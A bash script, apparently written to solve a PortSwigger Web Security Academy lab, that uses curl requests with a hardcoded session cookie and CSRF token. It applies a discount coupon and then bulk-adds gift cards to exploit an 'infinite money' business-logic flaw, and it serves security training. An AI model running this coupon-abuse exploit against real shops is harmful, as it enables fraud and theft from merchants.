#!/bin/bash
# for portswigger lab business logic error - infinite money logic flaw
# Lab vulnerable to a logic error in which attacker can get gift cards in bulk while using discount code and after reedeming those cards attacker end up having some extra money in his balance which he can further use in getting more cards to reedem. by doing so attacker can purchase anything for free

echo "setting up coupon"
# applying discount coupon
curl -i -s -k -X $'POST' \
    -H $'Host: 0ac500c303edca1cc0999d810068004f.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 53' -H $'Origin: https://0ac500c303edca1cc0999d810068004f.web-security-academy.net' -H $'Referer: https://0ac500c303edca1cc0999d810068004f.web-security-academy.net/cart' -H $'Upgrade-Insecure-Requests: 1' -H $'Te: trailers' -H $'Connection: close' \
    -b $'session=x97yjSSuLPQFXmXYJLD5ndw430Su109v' \
    --data-binary $'csrf=SP9wSXROvn6HFZzVhV426ZE44ufb7Iha&coupon=SIGNUP30' \
    $'https://0ac500c303edca1cc0999d810068004f.web-security-academy.net/cart/coupon'

# this loop will add 5*15 cards in cart
for (( i = 0; i < 15; i++ )); do

curl -i -s -k -X $'POST' \
    -H $'Host: 0ac500c303edca1cc0999d810068004f.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 36' -H $'Origin: https://0ac500c303edca1cc0999d810068004f.web-security-academy.net' -H $'Referer: https://0ac500c303edca1cc0999d810068004f.web-security-academy.net/product?productId=2' -H $'Upgrade-Insecure-Requests: 1' -H $'Te: trailers' -H $'Connection: close' \
    -b $'session=x97yjSSuLPQFXmXYJLD5ndw430Su109v' \
    --data-binary $'productId=2&redir=PRODUCT&quantity=5' \
    $'https://0ac500c303edca1cc0999d810068004f.web-security-academy.net/cart'
done
